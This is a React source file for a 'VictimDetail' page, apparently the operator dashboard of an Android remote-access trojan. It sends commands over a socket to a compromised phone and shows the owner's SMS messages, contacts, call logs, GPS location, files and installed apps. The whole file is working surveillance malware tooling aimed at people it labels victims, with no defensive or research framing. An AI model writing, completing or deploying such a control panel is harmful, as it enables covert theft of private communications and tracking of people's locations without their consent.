import React, { useState, useEffect } from 'react';
import { useParams, useNavigate } from 'react-router-dom';
import { ArrowLeft, MessageSquare, Users, Phone, MapPin, FileText, Camera, Package } from 'lucide-react';
import './VictimDetail.css';

function VictimDetail({ victims, socket }) {
  const { id } = useParams();
  const navigate = useNavigate();
  const [victim, setVictim] = useState(null);
  const [activeTab, setActiveTab] = useState('info');
  const [data, setData] = useState({
    sms: [],
    contacts: [],
    callLogs: [],
    apps: [],
    location: null,
    files: []
  });

  useEffect(() => {
    const found = victims.find(v => v.id === id);
    if (found) setVictim(found);
  }, [id, victims]);

  const sendCommand = (command, params = {}) => {
    if (socket && victim) {
      socket.emit('command', { victimId: victim.id, command, params });
    }
  };

  useEffect(() => {
    if (socket) {
      socket.on('command_result', (result) => {
        if (result.victimId === id) {
          if (result.command === 'get_sms') setData(prev => ({ ...prev, sms: result.result }));
          else if (result.command === 'get_contacts') setData(prev => ({ ...prev, contacts: result.result }));
          else if (result.command === 'get_call_logs') setData(prev => ({ ...prev, callLogs: result.result }));
          else if (result.command === 'get_apps') setData(prev => ({ ...prev, apps: result.result }));
          else if (result.command === 'get_location') setData(prev => ({ ...prev, location: result.result }));
          else if (result.command === 'get_files') setData(prev => ({ ...prev, files: result.result }));
        }
      });
    }
  }, [socket, id]);

  if (!victim) {
    return (
      <div className="victim-detail">
        <div className="not-found">Victim not found</div>
      </div>
    );
  }

  const tabs = [
    { id: 'info', label: 'Device Info', icon: Package },
    { id: 'sms', label: 'SMS', icon: MessageSquare },
    { id: 'contacts', label: 'Contacts', icon: Users },
    { id: 'calls', label: 'Call Logs', icon: Phone },
    { id: 'location', label: 'Location', icon: MapPin },
    { id: 'files', label: 'Files', icon: FileText },
    { id: 'apps', label: 'Apps', icon: Package }
  ];

  return (
    <div className="victim-detail">
      <div className="detail-header">
        <button className="back-btn" onClick={() => navigate('/')}>
          <ArrowLeft size={20} />
          Back
        </button>
        <div className="victim-info">
          <h1>{victim.info?.model || 'Unknown Device'}</h1>
          <span className={`status-indicator ${victim.status}`}>
            {victim.status === 'online' ? '● Online' : '○ Offline'}
          </span>
        </div>
      </div>

      <div className="tabs">
        {tabs.map(tab => {
          const Icon = tab.icon;
          return (
            <button
              key={tab.id}
              className={`tab ${activeTab === tab.id ? 'active' : ''}`}
              onClick={() => setActiveTab(tab.id)}
            >
              <Icon size={18} />
              {tab.label}
            </button>
          );
        })}
      </div>

      <div className="tab-content">
        {activeTab === 'info' && (
          <div className="info-grid">
            <div className="info-item">
              <span className="label">Device ID</span>
              <span className="value">{victim.id}</span>
            </div>
            <div className="info-item">
              <span className="label">Model</span>
              <span className="value">{victim.info?.model || 'N/A'}</span>
            </div>
            <div className="info-item">
              <span className="label">Android Version</span>
              <span className="value">{victim.info?.androidVersion || 'N/A'}</span>
            </div>
            <div className="info-item">
              <span className="label">IP Address</span>
              <span className="value">{victim.info?.ipAddress || 'N/A'}</span>
            </div>
          </div>
        )}

        {activeTab === 'sms' && (
          <div className="data-section">
            <button className="fetch-btn" onClick={() => sendCommand('get_sms')}>
              Fetch SMS Messages
            </button>
            {data.sms.length > 0 && (
              <div className="data-list">
                {data.sms.map((msg, idx) => (
                  <div key={idx} className="data-card">
                    <div className="card-header">
                      <strong>{msg.sender}</strong>
                      <span className="timestamp">{msg.time}</span>
                    </div>
                    <p>{msg.body}</p>
                  </div>
                ))}
              </div>
            )}
          </div>
        )}

        {activeTab === 'contacts' && (
          <div className="data-section">
            <button className="fetch-btn" onClick={() => sendCommand('get_contacts')}>
              Fetch Contacts
            </button>
            {data.contacts.length > 0 && (
              <div className="data-list">
                {data.contacts.map((contact, idx) => (
                  <div key={idx} className="data-card">
                    <strong>{contact.name}</strong>
                    <p>{contact.phone}</p>
                  </div>
                ))}
              </div>
            )}
          </div>
        )}

        {activeTab === 'calls' && (
          <div className="data-section">
            <button className="fetch-btn" onClick={() => sendCommand('get_call_logs')}>
              Fetch Call Logs
            </button>
            {data.callLogs.length > 0 && (
              <div className="data-list">
                {data.callLogs.map((call, idx) => (
                  <div key={idx} className="data-card">
                    <div className="card-header">
                      <strong>{call.number}</strong>
                      <span className={`call-type ${call.type}`}>{call.type}</span>
                    </div>
                    <p>Duration: {call.duration}s • {call.date}</p>
                  </div>
                ))}
              </div>
            )}
          </div>
        )}

        {activeTab === 'location' && (
          <div className="data-section">
            <button className="fetch-btn" onClick={() => sendCommand('get_location')}>
              Get Current Location
            </button>
            {data.location && (
              <div className="location-display">
                <p><strong>Latitude:</strong> {data.location.lat}</p>
                <p><strong>Longitude:</strong> {data.location.lng}</p>
                <p><strong>Accuracy:</strong> {data.location.accuracy}m</p>
              </div>
            )}
          </div>
        )}

        {activeTab === 'files' && (
          <div className="data-section">
            <button className="fetch-btn" onClick={() => sendCommand('get_files')}>
              List Files
            </button>
            {data.files.length > 0 && (
              <div className="data-list">
                {data.files.map((file, idx) => (
                  <div key={idx} className="data-card">
                    <strong>{file.name}</strong>
                    <p>{file.path} • {file.size}</p>
                  </div>
                ))}
              </div>
            )}
          </div>
        )}

        {activeTab === 'apps' && (
          <div className="data-section">
            <button className="fetch-btn" onClick={() => sendCommand('get_apps')}>
              Fetch Installed Apps
            </button>
            {data.apps.length > 0 && (
              <div className="data-list">
                {data.apps.map((app, idx) => (
                  <div key={idx} className="data-card">
                    <strong>{app.name}</strong>
                    <p>{app.package}</p>
                  </div>
                ))}
              </div>
            )}
          </div>
        )}
      </div>
    </div>
  );
}

export default VictimDetail;
